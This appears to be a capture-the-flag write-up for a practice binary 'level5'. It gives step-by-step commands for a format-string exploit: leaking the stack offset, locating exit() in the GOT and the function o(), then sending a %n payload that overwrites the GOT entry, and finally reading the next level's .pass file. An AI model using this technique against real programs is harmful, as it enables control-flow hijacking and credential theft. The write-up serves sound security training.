### 1. Find the offset of argument in the stack

```bash
$ ./level5
AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.bf000a78.b7fdd000.0.b7e5ec73.8048299.0.0.1.bffff91c.2f.bffff76c.b7fd0ff4.8048520.8049818.1.804835d.b7fd13e4.16.8049818.8048541.ffffffff.b7e5edc6.b7fd0ff4.b7e5ee55.b7fed280.0.bffff768.804850f.8048520.0.0
                              ^
                     The argument is here
```

So we get an offset of 4.

### 2. Find the offset of exit() in the GOT

```bash
$ objdump -R ./level5

./level5:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
...
08049838 R_386_JUMP_SLOT   exit
...
```

### 3. Find the address of o()

```bash
$ objdump -t ./level5
...
080484a4 g     F .text  0000001e              o
...
```

### 4. Write payload

We write the address of exit() in GOT, 134513824 chars (to get 0x080484a4 in the next %n use in format), and %4$n to write in the address of the fourth arg.

### 5. execute with exploit

```bash
$ (python -c 'print "\x38\x98\x04\x08%134513824x%4$n"'; cat) | ./level5
cat /home/user/level6/.pass
```
